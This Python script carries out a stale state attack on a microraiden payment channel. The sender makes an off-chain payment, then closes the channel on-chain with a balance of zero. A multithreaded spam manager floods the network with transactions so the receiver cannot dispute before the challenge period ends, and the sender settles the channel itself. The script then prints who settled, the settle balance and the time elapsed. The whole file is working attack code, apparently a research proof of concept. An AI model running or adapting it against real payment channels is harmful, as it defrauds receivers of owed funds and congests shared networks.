#!/usr/bin/python

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '../..'))

from microraiden import Client
from utils import (
    send_payment,
    create_close_channel_transaction,
    create_settle_channel_transaction,
    wait_for_open,
    wait_for_close,
    wait_for_settle,
)
import config as config
from web3 import Web3, HTTPProvider
from spamming import SpamManager
import logging, click, datetime

def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY, challenge_period: int = config.CHALLENGE_PERIOD):
    '''
    Performs a stale state attack on the given channel. 
    Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
    and spams the network with the given number {number_txs} of transactions from 
    the account with the given {private_key}.
    '''
    # Create close channel transaction
    close_tx = create_close_channel_transaction(channel=channel, balance=0)

    # Send close channel transaction    
    logging.info('Sending close transaction...')
    channel.core.web3.eth.sendRawTransaction(close_tx)

    # Start transaction spamming
    spam_manager = SpamManager(
        web3=channel.core.web3,
        private_key=config.PRIVATE_KEY,
        number_threads=8,
        nonce_offset=1,
        min_pending_txs=config.MIN_PENDING_TXS,
        callback=lambda nonce: send_settle(channel, nonce),
    )
    spam_manager.start()


    # Wait for channel to be closed
    closed_event = wait_for_close(channel)
    logging.info('Channel closed at block #{}'.format(closed_event['blockNumber']))

    # Update target block for spamming thread
    target_block = closed_event['blockNumber'] + challenge_period
    spam_manager.update_target_block(target_block)
    
    # Wait for channel to be settled
    settled_event = wait_for_settle(channel)
    logging.info('Channel settled at block #{}'.format(settled_event['blockNumber']))

    spam_manager.stop()

    settle_tx_hash = settled_event['transactionHash']
    settle_tx = channel.core.web3.eth.getTransaction(settle_tx_hash)

    close_block = channel.core.web3.eth.getBlock(closed_event['blockNumber'])
    settle_block = channel.core.web3.eth.getBlock(settled_event['blockNumber'])
    elapsed_time = datetime.timedelta(seconds=settle_block['timestamp']-close_block['timestamp']) 

    settled_by = settle_tx['from']
    if (settled_by == channel.receiver):
        settled_by = 'Receiver'
    if (settled_by == channel.core.address):
        settled_by = 'Sender'

    # Print result
    print()
    print('-----------------------------------------------------------')
    print('Sender \t\t {}'.format(channel.core.address))
    print('Receiver \t {}'.format(channel.receiver))
    # print('OPENED block \t #{}'.format(channel.block))
    # print('CLOSED block \t #{}'.format(closed_event['blockNumber']))
    # print('SETTLED block \t #{}'.format(settled_event['blockNumber']))
    print()
    # print('Spam transactions \t {}'.format(number_txs))
    print('Settled by \t {}'.format(settled_by))
    print('Settle balance \t {}'.format(settled_event['args']['_balance']))
    print('Elapsed time \t {}'.format(str(elapsed_time)))
    print('CLOSE->SETTLE \t {}'.format(settled_event['blockNumber']-closed_event['blockNumber']))
    print('-----------------------------------------------------------')
    print()

def send_settle(channel, nonce):
    settle_tx = create_settle_channel_transaction(channel, nonce)
    channel.core.web3.eth.sendRawTransaction(settle_tx)
    logging.info('Sent settle transaction')

@click.command()
@click.option(
    '--rpcport',
    default=8545,
    help='Port of the RPC server',
    type=int
)
def main(rpcport: int):
    # Initialize web3
    web3 = Web3(HTTPProvider('http://127.0.0.1:' + str(rpcport)))

    # Initialize client
    client = Client(private_key=config.PRIVATE_KEY, key_password_path=None, channel_manager_address=config.CHANNEL_MANAGER_ADDRESS)

    # Get an open channel
    channel = client.get_suitable_channel(receiver=web3.toChecksumAddress(config.RECEIVER_ADDRESS), value=1)

    # Wait for channel to be open
    opened_event = wait_for_open(channel=channel, confirmations=2)
    logging.info('Active channel: (sender={}, block={})'.format(channel.sender, channel.block))

    # Send an off-chain payment
    amount = 1
    channel.create_transfer(amount)
    send_payment(channel=channel, amount=amount)

    # Start stale state attack
    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY, challenge_period=config.CHALLENGE_PERIOD)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    main()
